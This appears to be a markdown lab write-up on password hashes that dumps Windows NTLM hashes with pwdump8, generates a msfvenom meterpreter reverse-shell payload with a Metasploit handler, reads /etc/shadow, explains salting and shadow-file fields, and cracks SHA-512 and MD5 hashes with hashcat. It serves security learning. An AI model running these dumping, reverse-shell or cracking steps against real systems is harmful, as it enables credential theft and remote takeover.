<img width="718" height="606" alt="image" src="https://github.com/user-attachments/assets/a370a5f7-6041-49ea-9d05-d76c5afce892" />

````
Expand-Archive -Path "pwdump8-8.2.zip" -DestinationPath ".\pwdump8_extracted"
cd .\pwdump8_extracted
ls
cd pwdump8
ls
````
<img width="822" height="397" alt="image" src="https://github.com/user-attachments/assets/3c3ed631-d454-4d42-a14b-e1c58be0bf97" />

- Execute:
````
.\pwdump8.exe
````
<img width="804" height="396" alt="image" src="https://github.com/user-attachments/assets/bfd34cf8-8632-4278-9d4e-b7526676e5ee" />

- Right now i got success, and get Hash.
````
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
DefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
WDAGUtilityAccount:504:AAD3B435B51404EEAAD3B435B51404EE:642F4325541AE4BFB64852E5C1F44DBC
mepol:1001:AAD3B435B51404EEAAD3B435B51404EE:5ADD2D9E50AA906144E6568DE632B9BE
````



### Crack windows Hash:
- Go back to our windows
<img width="791" height="197" alt="image" src="https://github.com/user-attachments/assets/00294157-baec-4f69-aa91-0dd467c04e7b" />



#### generate Payload 
````
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f exe -o shell.exe
````


#### Set Up Handler in Metasploit
````
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
exploit
````


- After get shell:
````




















---





### Salting
#### What is Salting?
Salting involves adding a unique, random string (called a salt) to a password before hashing it. The purpose is to prevent attackers from using precomputed tables (like rainbow tables) to crack passwords and to ensure that even if two users have the same password, their hashes will be different.
- Formula:
````
Digest = Hash(random string + password)
````


#### Why Salting Matters
1. Prevents Rainbow Table Attacks: Without salting, an attacker can use precomputed tables of hashes for common passwords. Salting makes these tables useless because the salt changes the input to the hash function.
2. Unique Hashes for Same Passwords: If two users choose the same password (e.g., "password123"), without salting, they would have identical hashes. With salting, each user gets a unique hash, even with the same password.
3. Increases Brute-Force Difficulty: Even if an attacker knows the salt, they must compute a separate hash for each password-salt combination, making brute-force attacks more time-consuming.

---



### Linux User Hashed Password:
<img width="1318" height="691" alt="image" src="https://github.com/user-attachments/assets/8aa071ee-5ca7-4f5c-936f-854432c390ef" />

- A typical line from `/etc/shadow` looks like this:
````
root:$6$SvDBb7FQjmMycxrp$ggCyS10ImONcAPx2aJ/5SrDB20sPBboLLPLu7T6Ry/e2rI4VffKpaXHi9nOJ36z6nuNVBc4PyKPmwsAy2e1Wr1:18746:0:99999:7:::
````
This is divided into several fields, separated by colons (:). The image highlights the first field, which contains the username and the hashed password.
1. UserName
  - The first part before the first colon (:) is the username.
  - In the example: root
2. Hash Algorithm
  - The second part (after the first $) indicates the hashing algorithm used.
  - Format: $ID$
  - Common IDs:
    - $1$: MD5
    - $2a$, $2y$: Blowfish / Eksblowfish (bcrypt)
    - $5$: SHA-256
    - $6$: SHA-512 (most common on modern systems)

3. Salt
  - The third part (between the second and third $) is the salt.
  - A random string generated when the password is set, unique for each user.
  - Purpose: Prevents rainbow table attacks and ensures different hashes even if two users have the same password.

4. Password Hash
  - The fourth part (after the third $) is the actual hashed password.
  - This is the result of hashing the user's password combined with the salt using the specified algorithm.

5. The rest
  - The remaining fields (after the password hash) contain account information:
  - Last password change (days since Jan 1, 1970)
  - Minimum password age
  - Maximum password age
  - Warning period
  - Inactivity period
  - Expiration date
  - Reserved field


#### To check the linux passwd and Shadow
- Go to our kali terminal:
````
cat /etc/passwd
````
<img width="942" height="787" alt="image" src="https://github.com/user-attachments/assets/69319126-dc24-440c-a02a-84471f088802" />

<img width="1066" height="730" alt="image" src="https://github.com/user-attachments/assets/93ce8b73-1c4f-469e-8167-0c2cc55634e1" />


````
cat /etc/shadow
````
<img width="542" height="768" alt="image" src="https://github.com/user-attachments/assets/f0df51a4-b465-4161-8ab0-f0547e13df18" />

<img width="1012" height="625" alt="image" src="https://github.com/user-attachments/assets/b42e2429-bd93-4020-a4dd-b759bfe3b859" />


- Check name
````
sudo cat /etc/shadow | grep root
````
<img width="393" height="85" alt="image" src="https://github.com/user-attachments/assets/36523d08-2766-4285-b610-249af46f56ab" />

````
sudo cat /etc/shadow | grep k4n0ng
````
<img width="1029" height="84" alt="image" src="https://github.com/user-attachments/assets/54e42c10-3301-401d-b12d-b90f66deef6b" />


#### Generate Hash
````
openssl passwd -6 -salt hello
````
Password: `password`:
<img width="1002" height="117" alt="image" src="https://github.com/user-attachments/assets/584de4c5-8401-4446-8035-9168bb90245c" />

- Hash: `$6$hello$Im24S3gqpSoo1XBg5Yzy21xN8G7DPxixiV9jiSDCBpVHbNLmKDYqTHyBW9V13m3B52RM7vVWBVpxBGue5BEtM0`
- `openssl passwd`: Tells OpenSSL to generate a password hash.
- `-6`: Uses SHA-512 algorithm (modern and secure).
- `-salt hello`: Specifies the salt to use. You can change this to any random string, it’s best practice to use a unique salt per user.


#### Crack Hash:
````
sudo mousepad hash.txt
````
````
$6$hello$Im24S3gqpSoo1XBg5Yzy21xN8G7DPxixiV9jiSDCBpVHbNLmKDYqTHyBW9V13m3B52RM7vVWBVpxBGue5BEtM0
````
<img width="714" height="456" alt="image" src="https://github.com/user-attachments/assets/2a072fd4-4290-4710-a9b1-46061bc2cfce" />

````
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
````
<img width="1198" height="701" alt="image" src="https://github.com/user-attachments/assets/b84345c0-37e2-4720-8cc8-9755fd93eee8" />

<img width="876" height="623" alt="image" src="https://github.com/user-attachments/assets/477b9b4a-6932-423b-b2a2-90d929b3e94c" />

---




## Cracking Password with hashcat:

### Basic cracking pasword with hashcat:
- In this i go to website `Cyberchef`: https://gchq.github.io/CyberChef/
<img width="1918" height="785" alt="image" src="https://github.com/user-attachments/assets/0d4b865c-4ed7-4526-aede-37ed5309c4e9" />

- In this i used password: `Password`
<img width="1918" height="787" alt="image" src="https://github.com/user-attachments/assets/c9cddde0-0e56-4ab2-a5a5-c026bfd6fb84" />

<img width="1918" height="790" alt="image" src="https://github.com/user-attachments/assets/f15b3db3-50f5-4b18-94a5-c5c2e2ffdb5b" />

- Copy this Hash: `dc647eb65e6711e155375218212b3964`

- Create file
````
sudo mousepad hashes.txt
````
````
dc647eb65e6711e155375218212b3964
````
<img width="658" height="384" alt="image" src="https://github.com/user-attachments/assets/8f602072-3fe5-4870-98ad-932a391e32e9" />


#### Start crack password:
````
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
````
<img width="1212" height="519" alt="image" src="https://github.com/user-attachments/assets/f952ea6e-16a4-46c4-85c2-c1c2267615eb" />

<img width="675" height="631" alt="image" src="https://github.com/user-attachments/assets/00faf280-d2dd-45f0-9ccc-392756e2d824" />

- Now we get successful to get tha password of hash.

---















